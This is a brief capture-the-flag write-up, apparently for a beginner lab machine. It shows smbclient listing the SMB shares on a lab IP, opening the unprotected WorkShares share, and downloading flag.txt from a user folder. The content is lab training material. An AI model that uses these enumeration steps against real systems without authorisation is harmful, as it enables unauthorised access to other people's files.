# [](#header-4)Connection

We will need to use samba to connect. With the option **-L** we can see all the folders we have. We can see that the last one doesn't have protection.
{% highlight plain %}
$ smbclient -L //10.129.119.218/
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk 
$ smbclient //10.129.119.218/WorkShares
{% endhighlight %}

# [](#header-4)Flag

With the command **get** we can download the file.
{% highlight plain %}
smb: \> ls
smb: \> cd James.P\
smb: \James.P\> ls
smb: \James.P\> get flag.txt
smb: \James.P\> exit

$ cat flag.txt 
{% endhighlight %}
